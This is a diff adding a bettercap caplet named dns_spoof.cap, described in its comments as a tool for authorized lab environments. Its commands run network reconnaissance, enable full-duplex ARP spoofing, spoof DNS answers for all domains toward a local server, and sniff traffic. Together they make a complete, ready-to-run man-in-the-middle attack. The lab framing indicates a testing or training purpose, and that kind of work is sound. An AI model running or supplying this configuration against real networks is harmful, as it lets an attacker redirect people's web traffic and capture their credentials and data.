@@ -1,0 +1,25 @@
+# dns_spoof.cap
+# Last Edited by Charles Duoto on November 17, 2026
+# ARP spoof + DNS spoof caplet for lab use.
+# Points chosen domains at the local Apache server (or whatever address you set).
+# Authorized lab environments only.
+#
+# Usage:
+#   bettercap -iface eth0 -caplet dns_spoof.cap
+#   (or use the launcher)
+
+net.recon on
+net.probe on
+
+set arp.spoof.fullduplex true
+# set arp.spoof.targets 192.168.1.10   # set by launcher
+
+arp.spoof on
+
+# DNS spoof
+set dns.spoof.all true
+# set dns.spoof.domains example.com,*.example.com
+# set dns.spoof.address 192.168.1.50   # defaults to local IP if omitted
+
+dns.spoof on
+net.sniff on
